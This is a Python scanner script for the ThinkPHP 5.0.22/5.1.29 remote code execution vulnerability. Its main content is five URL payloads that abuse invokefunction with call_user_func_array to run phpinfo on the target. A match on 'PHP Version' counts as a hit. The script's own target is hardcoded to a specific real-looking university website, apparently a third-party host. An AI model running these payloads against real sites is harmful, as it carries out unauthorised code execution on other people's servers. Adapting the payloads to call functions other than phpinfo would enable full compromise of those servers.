#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: thinkphp远程代码检测
description: ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
'''

import sys
import requests
from bs4 import BeautifulSoup


class thinkphp_rce(object):
    def __init__(self):
        pass

    def run(self, url):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"}
        payloads = [
            r"/thinkphp/public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            r"/thinkphp_5.0.22/public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            r"/thinkphp5.0.22/public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            r"/thinkphp5.1.29/public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            r"/thinkphp_5.1.29/public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
        ]
        for payload in payloads:
            vulnurl = url + payload
            try:
                response = requests.get(vulnurl, headers=headers, timeout=3, verify=False, allow_redirects=False)
                soup = BeautifulSoup(response.text, "lxml")
                if 'PHP Version' in str(soup.text):
                    print('[+] Remote code execution vulnerability exists at the target address')
                    print('[+] Vulnerability url address ' + vulnurl)
                    break
                else:
                    print('[-] There is no remote code execution vulnerability in the target address')
            except Exception as e:
                print('[!] Destination address cannot be connected')
                print(str(e))


if __name__ == "__main__":
    print('''----------------扫描开始-------------------
*Made by  :tdcoming
*For More :https://t.zsxq.com/Ai2rj6E
*MY Heart :https://t.zsxq.com/A2FQFMN
              _______   _                         _              
             |__   __| | |                       (_)             
                | |  __| |  ___  ___   _ __ ___   _  _ __    __ _
                | | / _` | / __|/ _ \ | '_ ` _ \ | || '_ \  / _` |
                | || (_| || (__| (_) || | | | | || || | | || (_| |
                |_| \__,_| \___|\___/ |_| |_| |_||_||_| |_| \__, |
                                                             __/ |
                                                            |___/
            ''')
    # if len(sys.argv) != 2:
    #    sys.exit("\n [+] Usage:  python %s http://x.x.x.x\n" % sys.argv[0])
    # url = sys.argv[1]
    url = "http://youthstudy.hnca.edu.cn/"
    thinkphp_rce().run(url)